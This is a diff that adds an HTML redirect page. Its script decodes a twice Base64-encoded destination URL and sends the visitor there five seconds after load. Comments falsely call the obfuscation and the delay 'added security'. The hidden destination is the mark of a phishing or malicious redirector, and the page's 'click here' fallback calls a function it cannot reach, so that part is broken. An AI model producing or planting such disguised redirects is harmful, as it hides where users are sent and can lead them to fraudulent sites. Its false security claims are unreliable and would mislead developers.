@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+
+    <!-- Security Headers -->
+    <meta name="referrer" content="no-referrer">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">
+    
+    <script>
+        (function() {
+            // Double-encoded Base64 URL for added security
+            const encodedURL = "YUhSMGNITTZMeTl0WldSaGRHRnVaVEF5TURRMU5qQXpNVEF5TkRReE9ESTFMMmN4TG1SbUxtcHdaVzUwY3k5d2IzSjBMbU52YlE9PQ==";
+            
+            function decodeAndRedirect() {
+                const destination = atob(atob(encodedURL)); // Double decode Base64
+                window.location.replace(destination); // Redirect user
+            }
+
+            // Execute redirect after page fully loads
+            window.onload = function() {
+                setTimeout(decodeAndRedirect, 5000); // 5-second delay for added security
+            };
+        })();
+    </script>
+</head>
+<body>
+    <p>Redirecting in a few seconds, please wait...</p>
+    <p>If you are not redirected, <a href="#" onclick="decodeAndRedirect(); return false;">click here</a>.</p>
+</body>
+</html>
